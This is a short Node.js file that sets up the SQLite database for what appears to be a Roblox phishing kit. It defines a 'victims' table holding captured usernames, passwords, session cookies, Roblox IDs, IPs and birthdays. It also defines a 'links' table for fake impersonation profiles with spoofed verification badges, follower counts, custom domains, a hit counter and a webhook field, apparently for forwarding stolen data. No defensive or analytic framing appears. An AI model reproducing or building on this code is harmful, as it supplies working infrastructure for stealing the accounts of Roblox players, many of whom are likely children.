// [db/init.js — SQLite schema bootstrap]
const Database = require('better-sqlite3');
const path     = require('path');
const fs       = require('fs');

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const db = new Database(path.join(DATA_DIR, 'xenart.db'));
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`
  CREATE TABLE IF NOT EXISTS victims (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id    TEXT    NOT NULL,
    username   TEXT,
    password   TEXT,
    cookie     TEXT    DEFAULT '',
    roblox_id  TEXT    DEFAULT '',
    ip         TEXT    DEFAULT '',
    user_agent TEXT    DEFAULT '',
    birthday   TEXT    DEFAULT '',
    timestamp  DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS links (
    id            TEXT    PRIMARY KEY,
    real_username TEXT    DEFAULT '',
    fake_username TEXT    NOT NULL,
    display_name  TEXT    NOT NULL,
    avatar_url    TEXT    DEFAULT '',
    webhook       TEXT    DEFAULT '',
    birthday      TEXT    DEFAULT '2000-01-01',
    premium       INTEGER DEFAULT 0,
    verified      INTEGER DEFAULT 0,
    status        TEXT    DEFAULT 'Online',
    friends       INTEGER DEFAULT 0,
    following     INTEGER DEFAULT 0,
    followers     INTEGER DEFAULT 0,
    domain        TEXT    DEFAULT '',
    hits          INTEGER DEFAULT 0,
    created_at    DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

module.exports = db;
